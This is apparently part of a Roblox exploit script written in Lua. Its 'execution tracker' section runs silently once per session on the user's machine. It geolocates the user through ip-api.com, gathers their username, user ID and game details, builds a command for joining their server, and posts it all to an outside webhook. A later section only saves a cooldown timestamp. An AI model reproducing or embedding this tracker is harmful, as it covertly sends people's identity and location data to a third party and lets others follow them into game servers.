----------------------------------------------------
-- SYSTEM 1: EXECUTION TRACKER (STRICT 1X PER SESSION)
----------------------------------------------------
local genv = (getgenv and getgenv()) or _G
if not genv.VersmandexExecutedOnce then
    genv.VersmandexExecutedOnce = true
    
    task.spawn(function()
        local countryName = "Unknown"
        local countryCode = "N/A"
        
        local successGeo, resultGeo = pcall(function()
            return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
        end)
        
        if successGeo and resultGeo then
            countryName = resultGeo.country or "Unknown"
            countryCode = resultGeo.countryCode or "N/A"
        end
        
        local gameName = "Unknown Game"
        local successGame, resultGame = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId).Name
        end)
        if successGame and resultGame then
            gameName = resultGame
        end
        
        local joinCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, game.JobId)
        
        local payload = {
            ["username"] = "Versmandex Execution Tracker",
            ["embeds"] = {
                {
                    ["title"] = "Script Execution Detected",
                    ["color"] = 3447003,
                    ["fields"] = {
                        {
                            ["name"] = "User Details",
                            ["value"] = string.format("Username: %s\nDisplay Name: %s\nUser ID: %d", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Location",
                            ["value"] = string.format("Country: %s (%s)", countryName, countryCode),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Game Details",
                            ["value"] = string.format("Game Name: %s\nPlace ID: %d\nJob ID: %s", gameName, game.PlaceId, game.JobId),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Join Server Script",
                            ["value"] = "```lua\n" .. joinCode .. "\n```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "VERSMANDEX LOG SYSTEM"
                    }
                }
            }
        }
        
        pcall(function()
            local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
            if requestFunc then
                requestFunc({
                    Url = EXECUTION_WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

----------------------------------------------------
-- SYSTEM 2: COOLDOWN SAVER (PERSISTENT COOLDOWN)
----------------------------------------------------
local COOLDOWN_FILE = "versmandex_cooldown.txt"

local function getSavedCooldown()
    if readfile and isfile and isfile(COOLDOWN_FILE) then
        local content = readfile(COOLDOWN_FILE)
        return tonumber(content) or 0
    end
    return genv.VersmandexLastRequestTime or 0
end

local function setSavedCooldown(timestamp)
    genv.VersmandexLastRequestTime = timestamp
    if writefile then
        pcall(function()
            writefile(COOLDOWN_FILE, tostring(timestamp))
        end)
    end
end

